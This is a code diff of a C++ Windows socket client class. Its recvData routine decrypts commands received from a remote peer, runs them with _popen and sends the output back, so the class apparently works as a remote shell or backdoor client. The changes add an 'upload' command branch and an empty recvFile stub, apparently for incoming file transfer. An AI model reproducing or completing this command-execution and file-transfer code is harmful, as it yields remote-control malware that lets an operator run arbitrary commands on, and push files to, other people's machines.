@@ -30,6 +30,7 @@ public:
 	int recvData();
 	void endclient();
 	int sendFile();
+	int recvFile();
 };
 
 //Constructor
@@ -170,13 +171,23 @@ int Socks::recvData() {
 		}
 		printf("Unencrypted message: %s\n", msg.c_str());
 		//////////////////////Parse msg for the word "upload"/////////////////////
+		if (msg == "upload") {
+			printf("Upload command sent");
+			// Send a response to the upload command "okay"
+			sendData("okay");
+			// start recv file
+
+			// 
 
 
+		}
+		else {
 
-		//////////////////////////////////////////////////////////////////////////
-		//need to pipe output into char array
-		//take address from captured response
-		char buffer[4000];
+			//
+			//////////////////////////////////////////////////////////////////////////
+			//need to pipe output into char array
+			//take address from captured response
+			char buffer[4000];
 		std::string data = "";
 		//runs a command 
 		FILE* _pipe = _popen(msg.c_str(), "r");
@@ -192,14 +203,16 @@ int Socks::recvData() {
 				data += buffer;
 		}
 		_pclose(_pipe);
-		
-		sendData(data);
-	}
-	else if (result == 0)
-		printf("Connection closed\n");
-	else
-		printf("recv failed: %d\n", WSAGetLastError());
 
+
+		sendData(data);
+		}
+	}
+			else if (result == 0)
+				printf("Connection closed\n");
+			else
+				printf("recv failed: %d\n", WSAGetLastError());
+		
 	return 0;
 }
 
@@ -228,6 +241,15 @@ int Socks::sendFile() {
 	}
 	return 0;
 }
+
+
+int Socks::recvFile() {
+	
+
+
+	return 0;
+}
+
 
 //close socket
 void Socks::endclient() {
